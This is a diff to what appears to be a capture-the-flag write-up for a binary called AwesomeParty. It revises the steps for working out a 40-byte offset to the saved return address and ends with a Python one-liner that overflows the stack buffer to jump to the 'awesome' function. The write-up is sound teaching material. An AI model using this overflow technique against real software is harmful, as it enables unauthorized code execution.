@@ -28,9 +28,9 @@ AwesomeParty `SHA1: 08797f1fd4473e8d09d64efda3ca429ea0d9afc0`
 4005af:	c9                   	leaveq
 4005b0:	c3                   	retq
 ```
-Where the third line tells us 32 bytes is reserved for a variable.
-3. Derive that one needs to override 32 bytes + rbp to overwrite return address.
-4. Also derive address of `awesome` function is `4005b1`.
+3. The third line tells us 32 bytes is reserved for a variable.
+4. Derive that one needs to override 32 bytes + rbp (8 bytes) to overwrite return address.
+5. Also derive address of `awesome` function is `4005b1`.
 
 Final command to exploit local program assuming machine uses little-endian:  
 `python -c 'print "a" * 40 + "\xb1\x05\x40"' | ./AwesomeParty`
